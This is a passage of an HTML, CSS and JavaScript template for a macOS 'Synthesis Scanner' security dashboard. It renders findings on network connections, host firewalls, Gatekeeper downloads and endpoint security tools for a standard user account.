  border-bottom: 1px solid var(--color-divider);
}
.topbar h1 { font-size: var(--text-lg); font-weight: 650; }
.meta { display: flex; gap: var(--space-4); flex-wrap: wrap; font-size: var(--text-xs); color: var(--color-text-muted); }
.meta b { color: var(--color-text); font-weight: 500; }
.content { padding: var(--space-6) var(--space-8) var(--space-12); display: flex; flex-direction: column; gap: var(--space-6); max-width: 1320px; }
.panel[hidden] { display: none; }
.panel { display: flex; flex-direction: column; gap: var(--space-6); }

/* ---------- Cards ---------- */
.card { background: var(--color-surface); border: 1px solid var(--color-divider); border-radius: var(--radius-lg); padding: var(--space-5); min-width: 0; }
.card-head { display: flex; align-items: baseline; justify-content: space-between; gap: var(--space-3); margin-bottom: var(--space-4); flex-wrap: wrap; }
.card-title { font-size: var(--text-sm); font-weight: 650; letter-spacing: 0.01em; }
.card-note { font-size: var(--text-xs); color: var(--color-text-muted); }
.grid-2 { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: var(--space-6); }
.kpis { display: grid; grid-template-columns: repeat(auto-fit, minmax(170px, 1fr)); gap: var(--space-4); }
.kpi { background: var(--color-surface); border: 1px solid var(--color-divider); border-radius: var(--radius-lg); padding: var(--space-4) var(--space-5); }
.kpi-label { font-size: var(--text-xs); color: var(--color-text-muted); }
.kpi-value { font-size: var(--text-xl); font-weight: 650; font-variant-numeric: tabular-nums lining-nums; line-height: 1.2; margin-top: var(--space-1); }
.kpi-sub { font-size: var(--text-xs); color: var(--color-text-faint); margin-top: var(--space-1); }
.kpi.alert .kpi-value { color: var(--sev-high); }
.kpi.warn .kpi-value { color: var(--sev-medium); }

/* Verdict banner */
.verdict { display: flex; align-items: center; gap: var(--space-5); padding: var(--space-5) var(--space-6); border-radius: var(--radius-lg); border: 1px solid; }
.verdict svg { width: 36px; height: 36px; flex: none; }
.verdict h2 { font-size: var(--text-lg); font-weight: 650; }
.verdict p { font-size: var(--text-sm); color: var(--color-text-muted); margin-top: var(--space-1); }
.verdict.clear { background: var(--ok-bg); border-color: color-mix(in oklab, var(--ok) 35%, transparent); color: var(--ok); }
.verdict.review { background: var(--sev-medium-bg); border-color: color-mix(in oklab, var(--sev-medium) 35%, transparent); color: var(--sev-medium); }
.verdict.action { background: var(--sev-high-bg); border-color: color-mix(in oklab, var(--sev-high) 35%, transparent); color: var(--sev-high); }
.verdict h2 { color: var(--color-text); }

/* Pills */
.sev, .tag {
  display: inline-flex; align-items: center; gap: var(--space-1); font-size: var(--text-xs); font-weight: 600;
  padding: 0.05rem var(--space-2); border-radius: var(--radius-full); white-space: nowrap; line-height: 1.6;
}
.sev::before { content: ""; width: 6px; height: 6px; border-radius: 50%; background: currentColor; }
.sev-high { color: var(--sev-high); background: var(--sev-high-bg); }
.sev-medium { color: var(--sev-medium); background: var(--sev-medium-bg); }
.sev-low { color: var(--sev-low); background: var(--sev-low-bg); }
.sev-info { color: var(--sev-info); background: var(--sev-info-bg); }
.tag { font-weight: 500; background: var(--color-surface-offset); color: var(--color-text-muted); }
.tag.ok { color: var(--ok); background: var(--ok-bg); }
.tag.bad { color: var(--sev-high); background: var(--sev-high-bg); }
.tag.warn { color: var(--sev-medium); background: var(--sev-medium-bg); }
.tag.new { color: var(--sev-low); background: var(--sev-low-bg); }

/* Module health */
.modules { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: var(--space-3); }
.module { display: flex; gap: var(--space-3); align-items: flex-start; padding: var(--space-3) var(--space-4); background: var(--color-surface-2); border-radius: var(--radius-md); border: 1px solid var(--color-divider); text-align: left; width: 100%; }
.module:hover { border-color: var(--color-border); background: var(--color-surface-offset); }
.dot { width: 9px; height: 9px; border-radius: 50%; margin-top: 0.45em; flex: none; }
.dot.ok { background: var(--ok); }
.dot.partial { background: var(--sev-medium); }
.dot.unavailable { background: var(--color-text-faint); }
.module-name { font-size: var(--text-sm); font-weight: 600; }
.module-reason { font-size: var(--text-xs); color: var(--color-text-muted); line-height: 1.45; margin-top: 2px; }

/* Filters */
.chips { display: flex; gap: var(--space-2); flex-wrap: wrap; }
.chip { font-size: var(--text-xs); padding: var(--space-1) var(--space-3); border-radius: var(--radius-full); border: 1px solid var(--color-border); color: var(--color-text-muted); }
.chip:hover { color: var(--color-text); border-color: var(--color-text-faint); }
.chip[aria-pressed="true"] { background: var(--color-primary-highlight); border-color: var(--color-primary); color: var(--color-text); }

/* Tables */
.table-wrap { overflow-x: auto; overscroll-behavior: contain; margin-inline: calc(-1 * var(--space-5)); padding-inline: var(--space-5); }
th, td { text-align: left; padding: var(--space-2) var(--space-3); font-size: var(--text-sm); border-bottom: 1px solid var(--color-divider); vertical-align: top; }
th { font-size: var(--text-xs); font-weight: 600; color: var(--color-text-muted); white-space: nowrap; padding-block: var(--space-2); }
th:first-child, td:first-child { padding-left: 0; }
th:last-child, td:last-child { padding-right: 0; }
tbody tr:last-child td { border-bottom: none; }
.th-btn { display: inline-flex; gap: var(--space-1); align-items: center; font-weight: 600; color: inherit; font-size: inherit; }
.th-btn:hover { color: var(--color-text); }
.sort-ind { font-size: 0.8em; width: 1em; color: var(--color-primary); }
td.wrap { word-break: break-word; min-width: 220px; }
td.clip { max-width: 360px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
td .detail { font-size: var(--text-xs); color: var(--color-text-muted); margin-top: 2px; }
td.r, th.r { text-align: right; }
.empty { padding: var(--space-6) var(--space-4); text-align: center; color: var(--color-text-muted); font-size: var(--text-sm); border: 1px dashed var(--color-border); border-radius: var(--radius-md); }
.empty b { display: block; color: var(--color-text); font-weight: 600; margin-bottom: var(--space-1); }

/* Bars */
.bars { display: flex; flex-direction: column; gap: var(--space-3); }
.bar-row { display: grid; grid-template-columns: minmax(110px, 180px) 1fr auto; gap: var(--space-3); align-items: center; font-size: var(--text-sm); }
.bar-name { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.bar-track { height: 10px; background: var(--color-surface-offset); border-radius: var(--radius-full); overflow: hidden; display: flex; }
.bar-out { background: var(--sev-medium); height: 100%; }
.bar-in { background: var(--color-primary); height: 100%; opacity: 0.75; }
.bar-val { font-size: var(--text-xs); color: var(--color-text-muted); font-variant-numeric: tabular-nums; white-space: nowrap; }
.legend { display: flex; gap: var(--space-4); font-size: var(--text-xs); color: var(--color-text-muted); }
.legend i { display: inline-block; width: 10px; height: 10px; border-radius: 2px; margin-right: var(--space-1); vertical-align: -1px; }

/* Posture checklist */
.checklist { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: var(--space-3); }
.check { display: flex; gap: var(--space-3); padding: var(--space-3) var(--space-4); background: var(--color-surface-2); border: 1px solid var(--color-divider); border-radius: var(--radius-md); }
.check svg { width: 20px; height: 20px; flex: none; margin-top: 2px; }
.check.ok svg { color: var(--ok); }
.check.bad svg { color: var(--sev-high); }
.check.unknown svg { color: var(--color-text-faint); }
.check-name { font-size: var(--text-sm); font-weight: 600; }
.check-val { font-size: var(--text-xs); color: var(--color-text-muted); word-break: break-word; }

.trend { display: flex; align-items: flex-end; gap: 4px; height: 96px; }
.trend-summary { display: grid; grid-template-columns: repeat(3, 1fr); gap: var(--space-2); margin-top: var(--space-4); padding-top: var(--space-3); border-top: 1px solid var(--color-divider); font-size: var(--text-xs); }
.trend-stat b { display: block; font-size: var(--text-sm); font-variant-numeric: tabular-nums; color: var(--color-text); }
.trend-bar { flex: 1; display: flex; flex-direction: column-reverse; border-radius: 2px; overflow: hidden; min-width: 6px; background: var(--color-surface-offset); }
.trend-bar span { display: block; }
.trend-axis { display: flex; justify-content: space-between; font-size: var(--text-xs); color: var(--color-text-faint); margin-top: var(--space-2); }

.logbox { font-family: var(--font-mono); font-size: var(--text-xs); background: var(--color-bg); border: 1px solid var(--color-divider); border-radius: var(--radius-md); padding: var(--space-3) var(--space-4); max-height: 320px; overflow: auto; overscroll-behavior: contain; white-space: pre-wrap; word-break: break-word; color: var(--color-text-muted); line-height: 1.6; }
.kv { display: grid; grid-template-columns: max-content 1fr; gap: var(--space-2) var(--space-6); font-size: var(--text-sm); }
.kv dt { color: var(--color-text-muted); }
.kv dd { word-break: break-word; }

/* ---------- Responsive ---------- */
@media (max-width: 900px) {
  .app { grid-template-columns: 1fr; }
  .sidebar { position: sticky; top: 0; z-index: 20; height: auto; flex-direction: column; gap: var(--space-3); padding: var(--space-3) var(--space-4); border-right: none; border-bottom: 1px solid var(--color-divider); }
  .nav { flex-direction: row; overflow-x: auto; overscroll-behavior: contain; scrollbar-width: none; margin-inline: calc(-1 * var(--space-4)); padding-inline: var(--space-4); }
  .nav-btn { width: auto; flex: none; }
  .sidebar-foot { display: none; }
  .topbar { position: static; padding: var(--space-4); }
  .content { padding: var(--space-4) var(--space-4) var(--space-10); }
  .grid-2 { grid-template-columns: 1fr; }
  .card { padding: var(--space-4); }
  .table-wrap { margin-inline: calc(-1 * var(--space-4)); padding-inline: var(--space-4); }
  .verdict { padding: var(--space-4); gap: var(--space-4); }
  .kpis { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: var(--space-3); }
  .bar-row { grid-template-columns: 96px 1fr auto; }
}
@media (prefers-reduced-motion: reduce) { *, *::before, *::after { transition-duration: 0.01ms !important; } }
</style>
</head>
<body>
<div class="app">
  <aside class="sidebar">
    <div class="brand">
      <svg class="brand-mark" viewBox="0 0 32 32" fill="none" aria-label="Mac Sentinel Synthesis Scanner" role="img">
        <path d="M16 3 5 7.5v7.2c0 6.9 4.6 12.2 11 14.3 6.4-2.1 11-7.4 11-14.3V7.5L16 3Z" stroke="currentColor" stroke-width="2.2" stroke-linejoin="round"/>
        <circle cx="16" cy="15.5" r="3.2" fill="currentColor"/>
      </svg>
      <div>
        <div class="brand-name">Synthesis Scanner</div>
        <div class="brand-sub">Standard-account monitor</div>
      </div>
    </div>
    <nav class="nav" role="tablist" aria-label="Report panels" id="nav"></nav>
    <div class="sidebar-foot" id="foot"></div>
  </aside>
  <div class="main">
    <header class="topbar">
      <h1 id="panel-title">Overview</h1>
      <div class="meta" id="meta"></div>
    </header>
    <main class="content" id="content"></main>
  </div>
</div>

<script id="report-data" type="application/json">__REPORT_JSON__</script>
<script>
(function () {
  "use strict";
  var R = JSON.parse(document.getElementById("report-data").textContent);

  // ---------- helpers ----------
  function esc(s) {
    return String(s === null || s === undefined ? "" : s).replace(/[&<>"']/g, function (c) {
      return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c];
    });
  }
  function fmtBytes(b) {
    b = Number(b) || 0;
    var u = ["B", "KB", "MB", "GB", "TB"], i = 0;
    while (b >= 1024 && i < u.length - 1) { b /= 1024; i++; }
    return (i === 0 ? b.toFixed(0) : b.toFixed(b < 10 ? 1 : 0)) + " " + u[i];
  }
  function fmtTime(iso) {
    if (!iso) return "—";
    var d = new Date(iso);
    if (isNaN(d)) return esc(iso);
    return d.toLocaleString([], { month: "short", day: "numeric", hour: "numeric", minute: "2-digit" });
  }
  function fmtClock(iso) {
    if (!iso) return "—";
    var d = new Date(iso);
    if (isNaN(d)) return esc(iso);
    return d.toLocaleTimeString([], { hour: "numeric", minute: "2-digit" });
  }
  var SEV_ORDER = { high: 0, medium: 1, low: 2, info: 3 };
  var SEV_LABEL = { high: "High", medium: "Medium", low: "Low", info: "Info" };
  function sev(s) { return '<span class="sev sev-' + esc(s) + '">' + esc(SEV_LABEL[s] || s) + "</span>"; }
  function tag(text, kind) { return '<span class="tag ' + (kind || "") + '">' + esc(text) + "</span>"; }
  function empty(title, body) { return '<div class="empty"><b>' + esc(title) + "</b>" + esc(body || "") + "</div>"; }
  function card(title, note, inner) {
    return '<section class="card"><div class="card-head"><h3 class="card-title">' + esc(title) + "</h3>" +
      (note ? '<span class="card-note">' + note + "</span>" : "") + "</div>" + inner + "</section>";
  }
  function kpi(label, value, sub, cls) {
    return '<div class="kpi ' + (cls || "") + '"><div class="kpi-label">' + esc(label) + '</div><div class="kpi-value">' +
      esc(value) + "</div>" + (sub ? '<div class="kpi-sub">' + esc(sub) + "</div>" : "") + "</div>";
  }
  var ICON = {
    overview: '<path d="M3 13h8V3H3v10Zm0 8h8v-6H3v6Zm10 0h8V11h-8v10Zm0-18v6h8V3h-8Z"/>',
    network: '<circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 0 1 0 18M12 3a14 14 0 0 0 0 18"/>',
    littlesnitch: '<path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z"/><circle cx="12" cy="12" r="3"/>',
    gatekeeper: '<rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/>',
    malwarebytes: '<path d="M12 3 4 6.5v5.7c0 4.6 3.4 8.4 8 9.8 4.6-1.4 8-5.2 8-9.8V6.5L12 3Z"/><path d="m9 12 2 2 4-4"/>',
    persistence: '<path d="M21 12a9 9 0 1 1-3-6.7"/><path d="M21 4v5h-5"/>'
  };
  function icon(name) {
    return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">' + ICON[name] + "</svg>";
  }
  var CHECK_ICON = {
    ok: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="m8 12 3 3 5-6"/></svg>',
    bad: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="m9 9 6 6M15 9l-6 6"/></svg>',
    unknown: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M9.5 9.5a2.5 2.5 0 1 1 3.5 2.3c-.6.3-1 .8-1 1.5v.7M12 17h.01"/></svg>'
  };

  // ---------- sortable tables ----------
  var TABLES = {}, tableSeq = 0;
  function table(cols, rows, emptyTitle, emptyBody) {
    if (!rows || !rows.length) return empty(emptyTitle || "Nothing to show", emptyBody);
    var id = "t" + (tableSeq++);
    TABLES[id] = { cols: cols, rows: rows.slice(), key: -1, dir: 1 };
    var head = cols.map(function (c, i) {
      return '<th scope="col" class="' + (c.num ? "r" : "") + '"><button class="th-btn" data-table="' + id + '" data-col="' + i + '">' +
        esc(c.label) + '<span class="sort-ind" aria-hidden="true"></span></button></th>';
    }).join("");
    return '<div class="table-wrap"><table id="' + id + '"><thead><tr>' + head + "</tr></thead><tbody>" + tbody(id) + "</tbody></table></div>";
  }
  function tbody(id) {
    var t = TABLES[id];
    return t.rows.map(function (r) {
      return "<tr>" + t.cols.map(function (c) {
        var v = c.render ? c.render(r) : esc(r[c.key]);
        return '<td class="' + (c.cls || "") + (c.num ? " r num" : "") + '">' + v + "</td>";
      }).join("") + "</tr>";
    }).join("");
  }
  document.addEventListener("click", function (e) {
    var b = e.target.closest(".th-btn");
    if (!b) return;
    var id = b.getAttribute("data-table"), ci = +b.getAttribute("data-col"), t = TABLES[id];
    var col = t.cols[ci];
    t.dir = t.key === ci ? -t.dir : 1; t.key = ci;
    var getter = col.sort || function (r) { return r[col.key]; };
    t.rows.sort(function (a, b2) {
      var x = getter(a), y = getter(b2);
      if (typeof x === "number" && typeof y === "number") return (x - y) * t.dir;
      return String(x === undefined ? "" : x).localeCompare(String(y === undefined ? "" : y)) * t.dir;
    });
    var tableEl = document.getElementById(id);
    tableEl.querySelector("tbody").innerHTML = tbody(id);
    tableEl.querySelectorAll(".sort-ind").forEach(function (s, i) { s.textContent = i === ci ? (t.dir === 1 ? "▲" : "▼") : ""; });
  });

  // ---------- data prep ----------
  var findings = (R.findings || []).slice().sort(function (a, b) { return SEV_ORDER[a.severity] - SEV_ORDER[b.severity]; });
  function countSev(list, s) { return list.filter(function (f) { return f.severity === s; }).length; }
  function moduleFindings(m) { return findings.filter(function (f) { return f.module === m; }); }
  var MODULES = [
    { id: "overview", label: "Overview" },
    { id: "network", label: "Network" },
    { id: "littlesnitch", label: "Firewalls" },
    { id: "gatekeeper", label: "Gatekeeper" },
    { id: "malwarebytes", label: "Endpoint Tools" },
    { id: "persistence", label: "Persistence" }
  ];
  var MOD_NAME = {}; MODULES.forEach(function (m) { MOD_NAME[m.id] = m.label; });

  function findingsTable(list, showModule) {
    var cols = [
      { label: "Severity", key: "severity", render: function (r) { return sev(r.severity); }, sort: function (r) { return SEV_ORDER[r.severity]; } },
      { label: "Finding", key: "title", cls: "wrap", render: function (r) {
        return esc(r.title) + (r.detail ? '<div class="detail">' + esc(r.detail) + "</div>" : "");
      } }
    ];
    if (showModule) cols.push({ label: "Source", key: "module", render: function (r) { return tag(MOD_NAME[r.module] || r.module); } });
    cols.push({ label: "Evidence", key: "evidence", cls: "clip", render: function (r) { return '<span class="mono" title="' + esc(r.evidence) + '">' + esc(r.evidence || "—") + "</span>"; } });
    return table(cols, list, "No findings", " Nothing in this area needs attention today.");
  }

  // ---------- panels ----------
  function renderOverview() {
    var h = countSev(findings, "high"), m = countSev(findings, "medium"), l = countSev(findings, "low");
    var verdict, title, msg, ico;
    if (h > 0) { verdict = "action"; title = h + " high-severity " + (h === 1 ? "finding needs" : "findings need") + " review"; msg = "Start with the High items below. Each row links back to its source panel."; ico = CHECK_ICON.bad; }
    else if (m > 0) { verdict = "review"; title = m + " medium " + (m === 1 ? "item" : "items") + " worth a look"; msg = "Nothing critical. Review new or changed items to confirm you expected them."; ico = CHECK_ICON.unknown; }
    else { verdict = "clear"; title = "All clear for the last " + (R.meta.window_hours || 24) + " hours"; msg = "No high or medium findings. Low and info items are listed for context."; ico = CHECK_ICON.ok; }

    var ms = R.module_status || {};
    var up = Object.keys(ms).filter(function (k) { return ms[k].state === "ok"; }).length;
    var net = R.network || {}, gk = R.gatekeeper || {}, ps = R.persistence || {};
    var unsigned = (gk.downloads || []).filter(function (d) { return d.verdict === "unsigned" || d.verdict === "stripped"; }).length;
    var changes = (ps.changes_count || 0);

    var html = '<div class="verdict ' + verdict + '">' + ico + "<div><h2>" + esc(title) + "</h2><p>" + esc(msg) + "</p></div></div>";
    html += '<div class="kpis">' +
      kpi("High findings", h, "Medium " + m + " · Low " + l, h ? "alert" : "") +
      kpi("Remote endpoints", (net.unique_remotes || 0), (net.samples || 0) + " network samples", "") +
      kpi("Downloads checked", (gk.downloads || []).length, unsigned + " unsigned or stripped", unsigned ? "warn" : "") +
      kpi("Persistence changes", changes, ps.baseline_created ? "Baseline created today" : "vs. saved baseline", changes ? "warn" : "") +
      kpi("Modules collected", up + " / " + Object.keys(ms).length, "Partial data is noted below", "") +
      "</div>";

    var modsHtml = '<div class="modules">' + MODULES.slice(1).map(function (mm) {
      var st = ms[mm.id] || { state: "unavailable", reason: "Not collected" };
      return '<button class="module" data-goto="' + mm.id + '"><span class="dot ' + esc(st.state) + '" aria-hidden="true"></span><span><span class="module-name">' +
        esc(mm.label) + ' <span class="sr-only">(' + esc(st.state) + ')</span></span><span class="module-reason" style="display:block">' + esc(st.reason) + "</span></span></button>";
    }).join("") + "</div>";

    var hist = (R.history || []).slice(-14);
    var max = Math.max.apply(null, hist.map(function (d) { return (d.high || 0) + (d.medium || 0) + (d.low || 0); }).concat([1]));
    var sumH = hist.reduce(function (a, d) { return a + (d.high || 0); }, 0);
    var sumM = hist.reduce(function (a, d) { return a + (d.medium || 0); }, 0);
    var cleanDays = hist.filter(function (d) { return !(d.high || 0) && !(d.medium || 0); }).length;
    var trend = hist.length ? '<div class="trend" role="img" aria-label="Findings per day, last ' + hist.length + ' days">' + hist.map(function (d) {
      var tot = (d.high || 0) + (d.medium || 0) + (d.low || 0);
      var pct = function (v) { return (v / max * 100).toFixed(1) + "%"; };
      return '<div class="trend-bar" style="height:100%" title="' + esc(d.date + ": " + d.high + " high, " + d.medium + " medium, " + d.low + " low") + '">' +
        '<span style="height:' + pct(d.high || 0) + ';background:var(--sev-high)"></span>' +
        '<span style="height:' + pct(d.medium || 0) + ';background:var(--sev-medium)"></span>' +
        '<span style="height:' + pct(d.low || 0) + ';background:var(--sev-low)"></span>' +
        (tot === 0 ? '<span style="height:3px;background:var(--color-border)"></span>' : "") + "</div>";
    }).join("") + '</div><div class="trend-axis"><span>' + esc(hist[0].date) + "</span><span>" + esc(hist[hist.length - 1].date) + "</span></div>" +
      '<div class="legend" style="margin-top:var(--space-3)"><span><i style="background:var(--sev-high)"></i>High</span><span><i style="background:var(--sev-medium)"></i>Medium</span><span><i style="background:var(--sev-low)"></i>Low</span></div>' +
      '<div class="trend-summary"><div class="trend-stat"><b class="num">' + cleanDays + " / " + hist.length + '</b>Clean days (no high/med)</div><div class="trend-stat"><b class="num">' + sumH + '</b>High across 14d</div><div class="trend-stat"><b class="num">' + sumM + "</b>Medium across 14d</div></div>"
      : empty("No history yet", " Trends appear after a few daily reports.");

    html += '<div class="grid-2">' + card("Module health", "Select a module to open it", modsHtml) + card("Findings trend", hist.length + " days", trend) + "</div>";

    var chips = '<div class="chips" id="sev-chips">' + ["all", "high", "medium", "low", "info"].map(function (s) {
      var n = s === "all" ? findings.length : countSev(findings, s);
      return '<button class="chip" aria-pressed="' + (s === "all") + '" data-sev="' + s + '">' + (s === "all" ? "All" : SEV_LABEL[s]) + " <span class=\"num\">" + n + "</span></button>";
    }).join("") + "</div>";
    html += '<section class="card"><div class="card-head"><h3 class="card-title">All findings</h3>' + chips + '</div><div id="findings-body">' + findingsTable(findings, true) + "</div></section>";
    return html;
  }

  function renderNetwork() {
    var n = R.network || {};
    var html = '<div class="kpis">' +
      kpi("Samples taken", n.samples || 0, n.first_sample ? fmtClock(n.first_sample) + " – " + fmtClock(n.last_sample) : "") +
      kpi("Processes online", n.unique_processes || 0, "Seen with sockets") +
      kpi("Remote endpoints", n.unique_remotes || 0, "Unique IP:port pairs") +
      kpi("Listening ports", (n.listening || []).length, "Accepting connections", (n.listening || []).some(function (l) { return !l.local_only; }) ? "warn" : "") +
      kpi("Data sent", fmtBytes(n.total_out || 0), "Received " + fmtBytes(n.total_in || 0)) +
      "</div>";
    html += card("Network findings", "Rules: unusual ports, odd binary paths, new processes, large uploads", findingsTable(moduleFindings("network"), false));

    var talkers = (n.top_talkers || []).slice(0, 10);
    var maxB = Math.max.apply(null, talkers.map(function (t) { return (t.bytes_out || 0) + (t.bytes_in || 0); }).concat([1]));
    var bars = talkers.length ? '<div class="legend" style="margin-bottom:var(--space-4)"><span><i style="background:var(--sev-medium)"></i>Sent</span><span><i style="background:var(--color-primary)"></i>Received</span></div><div class="bars">' + talkers.map(function (t) {
      return '<div class="bar-row"><span class="bar-name" title="' + esc(t.process) + '">' + esc(t.process) + '</span><span class="bar-track" aria-hidden="true"><span class="bar-out" style="width:' + ((t.bytes_out || 0) / maxB * 100).toFixed(2) + '%"></span><span class="bar-in" style="width:' + ((t.bytes_in || 0) / maxB * 100).toFixed(2) + '%"></span></span><span class="bar-val">↑ ' + fmtBytes(t.bytes_out) + " · ↓ " + fmtBytes(t.bytes_in) + "</span></div>";
    }).join("") + "</div>" : empty("No traffic data", " nettop samples have not been collected yet.");

    var listen = table([
      { label: "Process", key: "process" },
      { label: "Address", key: "address", render: function (r) { return '<span class="mono">' + esc(r.address) + "</span>"; } },
      { label: "Scope", key: "local_only", render: function (r) { return r.local_only ? tag("Localhost", "ok") : tag("All interfaces", "warn"); } }
    ], n.listening || [], "No listening sockets", " No user process is accepting inbound connections.");

    html += '<div class="grid-2">' + card("Top talkers", "Bytes per process across samples", bars) + card("Listening sockets", "Inbound-capable", listen) + "</div>";

    html += card("Outbound connections", "Aggregated across all samples · select a column to sort", table([
      { label: "Process", key: "process", render: function (r) { return esc(r.process) + '<div class="detail mono">' + esc(r.path || "") + "</div>"; } },
      { label: "Remote", key: "remote", render: function (r) { return '<span class="mono">' + esc(r.remote) + "</span>"; } },
      { label: "Port", key: "port", num: true },
      { label: "Proto", key: "proto" },
      { label: "Samples", key: "count", num: true },
      { label: "Last seen", key: "last_seen", render: function (r) { return fmtClock(r.last_seen); } },
      { label: "Flags", key: "flags", render: function (r) { return (r.flags || []).map(function (f) { return tag(f, "warn"); }).join(" ") || '<span class="faint">—</span>'; }, sort: function (r) { return -(r.flags || []).length; } }
    ], n.connections || [], "No connections recorded", " Run the sampler or wait for the next scheduled sample."));
    return html;
  }

  function renderLittleSnitch() {
    var ls = R.littlesnitch || {};
    var evs = ls.events || [];
    var lulu = ls.lulu || {};
    var html = '<div class="kpis">' +
      kpi("Little Snitch", ls.running ? "Running" : (ls.version ? "Stopped" : "Not installed"), ls.version ? "Version " + ls.version : "Optional", ls.version && !ls.running ? "alert" : "") +
      kpi("LuLu Firewall", lulu.running ? "Running" : (lulu.installed ? "Stopped" : "Not installed"), lulu.version ? "Version " + lulu.version : "Objective-See (Optional)", lulu.installed && !lulu.running ? "alert" : "") +
      kpi("Log events", evs.length, "Last " + (R.meta.window_hours || 24) + " hours") +
      kpi("Denied / blocked", ls.denied_count || 0, "Connections stopped", (ls.denied_count || 0) ? "warn" : "") +
      "</div>";
    html += card("Firewall findings", "Supports Little Snitch, Objective-See LuLu, and macOS Application Firewall", findingsTable(moduleFindings("littlesnitch"), false));
    var denied = evs.filter(function (e) { return e.denied; });
    html += card("Denied connections", denied.length + " events", table([
      { label: "Time", key: "time", render: function (r) { return fmtClock(r.time); } },
      { label: "Source", key: "process" },
      { label: "Message", key: "message", cls: "wrap", render: function (r) { return '<span class="mono">' + esc(r.message) + "</span>"; } }
    ], denied, "No denied connections", " Host firewalls did not report blocked connections in this window."));
    html += card("Recent firewall log events", "Most recent " + Math.min(evs.length, 200), table([
      { label: "Time", key: "time", render: function (r) { return fmtClock(r.time); } },
      { label: "Source", key: "process" },
      { label: "Message", key: "message", cls: "wrap", render: function (r) { return '<span class="mono">' + esc(r.message) + "</span>"; } }
    ], evs.slice(0, 200), "No log events", ls.note ? " " + ls.note : " No user-readable firewall log events in this window."));
    return html;
  }

  function renderGatekeeper() {
    var g = R.gatekeeper || {};
    var posture = (g.posture || []).map(function (p) {
      return '<div class="check ' + esc(p.state) + '">' + CHECK_ICON[p.state === "ok" ? "ok" : p.state === "bad" ? "bad" : "unknown"] +
        '<div><div class="check-name">' + esc(p.name) + '</div><div class="check-val">' + esc(p.value) + "</div></div></div>";
    }).join("");
    var dl = g.downloads || [];
    var VERDICT = {
      ok: ["Notarized", "ok"], signed: ["Signed", "ok"], unsigned: ["Unsigned", "bad"], stripped: ["Quarantine removed", "bad"],
      rejected: ["Rejected by Gatekeeper", "bad"], document: ["Document", ""], unknown: ["Unverified", "warn"]
    };
    var html = card("OS protections", "Checked without admin rights", '<div class="checklist">' + posture + "</div>");
    html += card("Gatekeeper & download findings", "", findingsTable(moduleFindings("gatekeeper"), false));
    html += card("Recent downloads & apps", dl.length + " items · ~/Downloads and ~/Applications, last 7 days", table([
      { label: "File", key: "name", cls: "wrap", render: function (r) { return esc(r.name) + '<div class="detail">' + esc(r.where_from || "Origin unknown") + "</div>"; } },
      { label: "Type", key: "kind" },
      { label: "Quarantine", key: "quarantined", render: function (r) { return r.quarantined ? tag("Flagged", "ok") : tag("None", r.executable ? "warn" : ""); } },
      { label: "Signer", key: "signer", cls: "wrap", render: function (r) { return esc(r.signer || "—"); } },
      { label: "Verdict", key: "verdict", render: function (r) { var v = VERDICT[r.verdict] || [r.verdict, ""]; return tag(v[0], v[1]); } },
      { label: "Added", key: "modified", render: function (r) { return fmtTime(r.modified); } }
    ], dl, "No new downloads", " Nothing new in Downloads or Applications this week."));
    html += card("XProtect diagnostic reports", "~/Library/Logs/DiagnosticReports", table([
      { label: "File", key: "name", render: function (r) { return '<span class="mono">' + esc(r.name) + "</span>"; } },
      { label: "Date", key: "modified", render: function (r) { return fmtTime(r.modified); } }
    ], g.xprotect_reports || [], "No XProtect reports", " XProtect has not written a detection report for this account."));
    if (g.xprotect_log && g.xprotect_log.length) {
      html += card("XProtect log excerpt", "Unified log, if readable", '<div class="logbox">' + esc(g.xprotect_log.join("\n")) + "</div>");
    }
    return html;
  }

  function renderMalwarebytes() {
    var mb = R.malwarebytes || {};
    var procs = mb.processes || [];
    var tools = mb.tools || [];
    var activeTools = tools.filter(function (t) { return t.installed || t.running; }).length;
    var html = '<div class="kpis">' +
      kpi("Suites detected", activeTools + " / " + (tools.length || 5), "Malwarebytes, Objective-See, ClamAV") +
      kpi("Active daemons", procs.length, procs.length ? "Running now" : "None detected") +
      kpi("Readable logs", (mb.logs || []).length, "Files this account can open") +
      kpi("Detection lines", (mb.log_lines || []).length, "Matched threat keywords", (mb.log_lines || []).length ? "warn" : "") +
      "</div>";
    if (tools.length) {
      var toolsGrid = '<div class="checklist">' + tools.map(function (t) {
        var st = t.running ? "ok" : (t.installed ? "bad" : "unknown");
        return '<div class="check ' + st + '">' + CHECK_ICON[st] +
          '<div><div class="check-name">' + esc(t.name) + '</div><div class="check-val">' + esc(t.detail) + "</div></div></div>";
      }).join("") + "</div>";
      html += card("Supported endpoint & Objective-See tools", "Auto-detected in /Applications and process table", toolsGrid);
    }
    html += card("Endpoint tool findings", "", findingsTable(moduleFindings("malwarebytes"), false));
    html += '<div class="grid-2">' + card("Running security processes", "", table([
      { label: "PID", key: "pid", num: true },
      { label: "Process", key: "name", cls: "wrap", render: function (r) { return '<span class="mono">' + esc(r.name) + "</span>"; } }
    ], procs, "No processes", " No third-party endpoint security daemons detected running.")) +
      card("Readable log files", "", table([
        { label: "File", key: "path", cls: "wrap", render: function (r) { return '<span class="mono">' + esc(r.path) + "</span>"; } },
        { label: "Modified", key: "modified", render: function (r) { return fmtTime(r.modified); } }
      ], mb.logs || [], "No readable logs", " Most commercial AV logs live in root-only folders. Check each app's GUI history.")) + "</div>";
